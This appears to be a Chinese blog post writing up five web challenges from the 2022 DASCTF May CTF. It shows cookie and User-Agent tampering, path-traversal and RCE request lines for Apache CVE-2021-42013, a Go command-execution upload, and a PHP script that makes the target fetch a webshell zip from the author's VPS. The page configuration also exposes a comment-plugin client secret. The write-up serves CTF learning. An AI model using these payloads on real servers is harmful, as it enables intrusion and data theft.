@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Latte">
+    
+    <title>
+        
+            2022DASCTF MAY 出题人挑战赛 web |
+        
+        Latte&#39;s
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.1/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"ohvy.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Latte's","author":"Latte","avatar":"/images/cat.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","tools":"/tools","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Latte and Americano.","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/ohvy","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":"shiwwang@163.com"}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":false},"comment":{"enable":true,"use":"gitalk","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":"ohvy","github_admins":null,"repository":"gitalk","client_id":"Ov23liQm7PTQpK5JLa0h","client_secret":"ba0525d7d59a301a09ac76ed9299df6ceb9a42a5","proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2022,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{"tools":[{"category":"聊天 AI"},{"name":"ChatGPT","link":"https://chat.openai.com/","description":"OpenAI 旗下 AI 聊天对话工具","image":"/images/tools/chatgpt.svg"},{"name":"Gemini","link":"https://gemini.google.com/app","description":"Google 旗下 AI 聊天对话工具","image":"/images/tools/gemini.svg"},{"category":"待开发"}]},"version":"4.1.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Latte&#39;s
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                
+                                分类
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tools"
+                            >
+                                
+                                工具
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >分类</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tools"
+                    >工具</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        2022DASCTF MAY 出题人挑战赛 web
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/cat.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Latte</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2022-12-06 00:31:59</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Mon May 06 2024 20:45:45 GMT+0800">2024-05-06 20:45:45</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/Write-Up/">Write Up</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/CTF/">CTF</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/web/">web</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h1 id="Power-Cookie"><a href="#Power-Cookie" class="headerlink" title="Power Cookie"></a>Power Cookie</h1><blockquote>
+<p>提示：只有admin才可以获取flag</p>
+</blockquote>
+<p>依据提示可以猜测，本题可能需要通过修改cookie值来获取flag。<br>使用Burp Suite抓包查看Response包<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102430418-1960049030.png"
+                         width=500
+                 ><br>发现<code>admin=0</code><br>于是在Request包中加入<code>Cookie: admin=1</code><br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102611588-243656756.png"
+                         width=500
+                 ></p>
+<p>成功得到flag！</p>
+<hr>
+<blockquote>
+<p>本题做题过程初始，博主将<code>Cookie: admin=1</code>插在了请求包的末尾（如下图所示）<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102906051-436308076.png"
+                         width=500
+                 ><br>导致始终无响应，查阅资料发现header匹配到<code>Upgrade</code>时将被终止，调整位置后成功解决，原因庶几如此（<a class="link"   target="_blank" rel="noopener" href="http://t.zoukankan.com/qinmengjiao123-123-p-13685262.html" >请求头 header中传cookie不生效原因<i class="fas fa-external-link-alt"></i></a>）</p>
+</blockquote>
+<hr>
+<hr>
+<h1 id="魔法浏览器"><a href="#魔法浏览器" class="headerlink" title="魔法浏览器"></a>魔法浏览器</h1><p>进入后得到提示：</p>
+<blockquote>
+<p>提示：flag.txt<br>为保证文档安全。请使用魔法浏览器来访问。</p>
+</blockquote>
+<p>不明所以，F12查看<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817104826955-2116924557.png"
+                         width=500
+                 ><br>得到进一步提示，需要<code>let ua = &quot;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35&quot;</code><br>结合“使用魔法浏览器”可以猜想到应该将请求报文中的User-Agent修改为其要求的“Magic”内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75</span><br></pre></td></tr></table></figure>
+
+<p>发送，成功得到flag<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817105507623-1654583652.png"
+                         width=500
+                 ></p>
+<p>[看其他师傅的wp时发现可以用console执行js，而不用去utf-8转码，又学到了一点]<img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817110336451-169494747.png"
+                         width=700
+                 ></p>
+<hr>
+<hr>
+<h1 id="getme"><a href="#getme" class="headerlink" title="getme"></a>getme</h1><p>F12查看，一脸懵逼<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182444328-2077107608.png"
+                         width=500
+                 ><br>除了一行路径<code>pwd:/usr/local/apache2/</code>，得知其是apache，别无其它信息。<br>抓包查看返回包：<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182848657-222743158.png"
+                         width="200"
+                 ><br>只能说“黔驴技穷”。之后查找师傅们的wp和网上的各种资料，得知**Apache&#x2F;2.4.50 (Unix)**版本存在任意路径穿越漏洞（这时再回想起一开始的那一行路径，或许也是在提示这一点罢）。<br>[ <a class="link"   target="_blank" rel="noopener" href="https://github.com/asaotomo/CVE-2021-42013-Apache-RCE-Poc-Exp" >Apache 远程代码执行（CVE-2021-42013）<i class="fas fa-external-link-alt"></i></a>]<br>直接找到CVE，用poc和exp去打</p>
+<blockquote>
+<p>&#x2F;&#x2F;查看任意文件<br><code>GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1</code></p>
+</blockquote>
+<p>(若将<code>etc/passwd</code>改为<code>flag</code>，则可读取到flag，不过是假的，我们后面再看)</p>
+<blockquote>
+<p>&#x2F;&#x2F;执行任意命令<br><code>GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</code></p>
+</blockquote>
+<p>我们利用exp和Burp Suite发送命令<br><code>echo Content-Type: text/plain; echo;ls / //这里的Content-Type: text/plain 规定将文件设置为纯文本的形式</code></p>
+<img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184819761-451478684.png"
+                         width=500
+                 >
+
+<p>从而查看到所有的文件名，在其中发现flag，试图<code>echo;cat /flag</code>读取<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184950024-333636240.png"
+                         width=500
+                 ><br>结果发现为假，只能从其他的文件下手，这里凭运气选一个最奇怪的<code>diajgk</code>，然后一层层查看，最终在第四层发现一个貌似flag的文件，cat读取得到flag<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185335437-2104134847.png"
+                         width=500
+                 ></p>
+<hr>
+<p>这一题有三个问题在耗费了大量的时间，需要找时间再去理解清晰：<br>1、在找flag的点上存在一些问题，如果要一个个去把文件都试一遍未免过于离谱。在找办法的过程中发现一位师傅通过分析查看日志的办法找到最终真正的flag的路径，不过因为不知道其使用了怎么样的命令而无法复现（点击图片可跳转到这位师傅的博客）<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/124994738"><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185839323-780544381.png"
+                         width=500
+                 ></a><br>2、如何运用该exp去执行更多其他的命令，有何规范？（我自己尝试的cd、tail等均无效）<br>3、echo有什么作用，与分号联合怎样使用？</p>
+<hr>
+<hr>
+<h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p>这题不出意外的没有什么思路，发现<strong>GOTOLIST</strong>是可以点击的链接，里面又有8个链接，一个个点进去，没有头绪，奇怪的是users点进去出现了这样一句：</p>
+<blockquote>
+<p>Sorry there doesn’t seem to be a users.go file</p>
+</blockquote>
+<p>又结合最后一个链接——上传一个**.go<strong>文件，猜测需要用该链接上传一个名叫</strong>users.go**的go文件，然后点击users执行文件。然而博主并不知道什么是go文件，也不知道怎么用，继续懵逼着去翻大佬们的wp，得知可以找到执行命令的go脚本 <a class="link"   target="_blank" rel="noopener" href="https://golang.iswbm.com/c05/c05_02.html" >os&#x2F;exec 执行命令的五种姿势<i class="fas fa-external-link-alt"></i></a>！</p>
+<p>选择执行命令并且能获取结果的办法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line">&quot;os/exec&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    cmd := exec.Command(&quot;ls&quot;,&quot;/&quot;)</span><br><span class="line">    out, err := cmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        fmt.Printf(&quot;combined out:\n%s\n&quot;, string(out))</span><br><span class="line">        log.Fatalf(&quot;cmd.Run() failed with %s\n&quot;, err)</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Printf(&quot;combined out:\n%s\n&quot;, string(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现成功执行了<code>ls /</code>命令<br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203359350-1628717592.png"
+                       
+                 ><br>且成功找到了藏起来的flag，将<code>cmd := exec.Command(&quot;ls&quot;,&quot;/&quot;)</code>更改为<code>cmd := exec.Command(&quot;cat&quot;,&quot;/flag&quot;)</code><br><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203655197-291459483.png"
+                        alt="成功获取flag"
+                 ><br>成功获取flag！</p>
+<hr>
+<hr>
+<h1 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h1><p>下载文件后，发现有<code>admin.php</code>文件<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818201224459-1716179419.png"
+                         width=200
+                 ></p>
+<p>得知该网站存在后台，对文件全局搜索“密码”，碰巧发现</p>
+<img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818202107960-1160034001.png"
+                         width=500
+                 >
+
+<p>用<code>admin 123456</code>成功登入后台。逛了一圈，能点的都点了一遍，没发现什么可利用的信息。于是一个个翻看源码，可是博主不够敏锐，没能发现存在着<code>Update.php</code>可以上传文件，后来查看其他大佬的wp才回过神来：嗯，在admin文件夹里，确实应该再仔细看一看。</p>
+<img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203053359-275459141.png"
+                         width=600
+                 >
+
+<p>这段代码告诉我们，在这个页面，可以用<code>GET</code>方式传<code>url</code>值，然后该<code>url</code>经<code>sys_auth()</code>函数处理后就会被下载，判断<code>Content-Type</code>值为<code>application/zip</code>就会被解压，然后输出 <code>版本升级成功~</code></p>
+<p>于是考虑<code>sys_auth()</code>函数作何用处——加密或解密<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203716598-553405938.png"
+                         width=500
+                 ><br>且可判断，当<code>type=0</code>时加密，传入<code>type=1</code>为解密。<br>那么就思路便明确了，我们只需要在vps上部署一个“一句话木马”的压缩文件（.zip），得到<code>webshell.zip</code>的url，然后将该url用源码中的<code>sys_auth()</code>加密，最后以GET方式把加密后的url上传即可，具体实现如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(&#x27;Mc_Encryption_Key&#x27;,&#x27;GKwHuLj9AOhaxJ2&#x27;);</span><br><span class="line"></span><br><span class="line">//字符加密、解密 [0为加密，1为解密]</span><br><span class="line">function sys_auth($string, $type = 0, $key = &#x27;&#x27;, $expiry = 0) &#123;</span><br><span class="line">	if(is_array($string)) $string = json_encode($string);</span><br><span class="line">	if($type == 1) $string = str_replace(&#x27;-&#x27;,&#x27;+&#x27;,$string);</span><br><span class="line">	$ckey_length = 4;</span><br><span class="line">	$key = md5($key ? $key : Mc_Encryption_Key);</span><br><span class="line">	$keya = md5(substr($key, 0, 16));</span><br><span class="line">	$keyb = md5(substr($key, 16, 16));</span><br><span class="line">	$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#x27;&#x27;;</span><br><span class="line">	$cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line">	$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf(&#x27;%010d&#x27;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line">	$result = &#x27;&#x27;;</span><br><span class="line">	$box = range(0, 255);</span><br><span class="line">	$rndkey = array();</span><br><span class="line">	for($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line">	for($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line">	for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + 1) % 256;</span><br><span class="line">		$j = ($j + $box[$a]) % 256;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">	&#125; </span><br><span class="line">	if($type == 1) &#123;</span><br><span class="line">		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</span><br><span class="line">			$result = substr($result, 26);</span><br><span class="line">			$json = json_decode($result,1);</span><br><span class="line">			if(!is_numeric($result) &amp;&amp; $json)&#123;</span><br><span class="line">				return $json;</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				return $result;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return &#x27;&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	return str_replace(&#x27;+&#x27;, &#x27;-&#x27;, $keyc.str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($result)));</span><br><span class="line">&#125;</span><br><span class="line">//以下为利用源码函数进行sys加密</span><br><span class="line">$ans=sys_auth(&quot;http://ip.ip.ip.ip/acmd.zip&quot;);//我上传的webshell压缩文件名为acmd.zip</span><br><span class="line">var_dump($ans);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用如上exp得到加密的url：</p>
+<blockquote>
+<p>事实上博主第一次失败了，发现原来代码里还存在着一个全局变量<img  
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818204653057-598288141.png"
+                       
+                 ><br>跟踪查找即可以找到<code>define(&#39;Mc_Encryption_Key&#39;,&#39;GKwHuLj9AOhaxJ2&#39;);</code><br>加上这句定义后成功</p>
+</blockquote>
+<p><code>string(79) &quot;498bUpfpc2DVbWQdqxFIo8gRcC76FVJksWQcRwY5OCDSBXHMEF3zd07OYVMsJekRsip5UY2acffwS1Q&quot;</code><br>拿到加密url后直接上传：<br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205303419-51425222.png"
+                         width=500
+                 ><br><img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205518891-1217499246.png"
+                         width=500
+                 ></p>
+<p>成功！接下来，我便开始试图在<code>update.php</code>源码中找到文件下载或解压后所在的位置，此间跟踪了几个类、函数如<code>mczip-&gt;PclZip()</code>结果并没有分析出什么来，只得再去翻看其他师傅的wp，发现他们的后门就在根目录下，于是蚁剑🗡连接，flag还是在根目录下:</p>
+<img    
+                       lazyload
+                       alt="image"
+                       data-src="https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818210721537-1371645933.png"
+                         width=500
+                 >
+
+<p>打开后成功得到flag<code>DASCTF&#123;86527acc-676d-4267-a1a1-b46337a3a2a6&#125;</code></p>
+<hr>
+<p>这题于我而言很扯淡的点就是vps部署和解压目录查找，一开始我脑子有点进淼竟然用本地的PHP study搭建的网站上传压缩包……结果当然就是失败，报错信息是<code>压缩包不zip类型文件</code>我直接傻掉，一直在想如何把压缩包的content type类型调成他要求的zip，完全忽略了他根本进不了我的本地站点…后来部署在vps上成功得以解决；至于第二点仍需要学习，希望<strong>多指教</strong>~</p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CTF/">CTF</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/web/">web</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2022/12/06/2022Dest0g3-520%E8%BF%8E%E6%96%B0%E8%B5%9B-web(1-5%E9%A2%98)/"
+                                   title="2022Dest0g3-520迎新赛-web(1-5题)"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">2022Dest0g3-520迎新赛-web(1-5题)</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2022/12/06/2022DASCTF-Sept-X-%E6%B5%99%E6%B1%9F%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E7%A7%8B%E5%AD%A3%E6%8C%91%E6%88%98%E8%B5%9B-web/"
+                                   title="2022DASCTF Sept X 浙江工业大学秋季挑战赛 web"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">2022DASCTF Sept X 浙江工业大学秋季挑战赛 web</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
